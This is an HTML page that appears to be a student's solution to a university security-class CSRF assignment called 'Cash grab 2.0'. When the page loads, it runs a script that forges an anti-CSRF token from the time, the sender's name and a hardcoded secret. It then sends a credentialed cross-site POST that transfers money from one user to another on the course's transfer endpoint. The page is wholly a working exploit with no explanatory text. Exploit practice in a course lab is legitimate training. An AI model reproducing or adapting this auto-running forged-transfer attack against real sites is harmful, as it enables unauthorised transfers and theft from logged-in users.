<!DOCTYPE html>
<html>
    <head>
        <title>Cash grab 2.0</title>
        <meta charset="UTF-8">
        <script src="https://insecurityclass.cs.uchicago.edu/3/sjcl.js"></script>
        <script src="https://insecurityclass.cs.uchicago.edu/3/sha512.js"></script>
        <script src="https://insecurityclass.cs.uchicago.edu/3/codecHex.js"></script>
        <script src="https://insecurityclass.cs.uchicago.edu/3/bitArray.js"></script>
        <script src="https://insecurityclass.cs.uchicago.edu/3/codecString.js"></script>
        <script>
            function computecsrf(sendername) {
                return (sjcl.codec.hex.fromBits(sjcl.hash.sha512.hash(String(Math.floor(Date.now() / 10000)) + sendername + "dorsteniagigas")));
            }
            
            function steal() {
                var sender = "blase"
                
                var xhr = new XMLHttpRequest();
                xhr.open('POST', "https://insecurityclass.cs.uchicago.edu/3/transfer.php", true);
                xhr.withCredentials = true;
                xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                var post_string = "sender="+sender+"&recipient=amiller68&amount=69&csrftoken="+computecsrf(sender);
                console.log(post_string);
                xhr.send(post_string);
                console.log("it be sent me matey");
            };
        </script>
    </head>

    <body onload="steal();">
        <p> Oooooh WEEE! Mooooney</p>
    </body>
</html>